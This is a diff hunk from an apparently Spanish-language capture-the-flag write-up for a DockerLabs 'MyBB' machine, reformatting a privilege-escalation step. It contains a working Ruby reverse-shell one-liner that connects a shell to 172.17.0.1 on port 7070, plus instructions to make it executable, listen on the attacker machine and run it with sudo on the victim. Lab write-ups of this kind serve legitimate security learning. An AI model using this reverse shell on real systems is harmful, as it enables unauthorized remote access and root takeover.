@@ -140,8 +140,10 @@ Para crear el script Ruby con echo desde el terminal, puedes usar el siguiente c
 
 `echo "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"172.17.0.1\",7070))'" > reverse_shell.rb`  
 
-Ahora daremos permisos de ejecución al script recién creado con el comando `chmod +x reverse_shell.rb`.  
+Y luego les daremos permisos de ejecución con el comando:
 
+`chmod +x reverse_shell.rb`
+ 
 ![M](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/MyBB/M_22.png)      
 
 Ahora no nos quedará más que ponernos a escuchar en el puerto 7070 de nuestra máquina atacante y ejecutar el comando `sudo ./reverse_shell.rb` en la máquina víctima.  
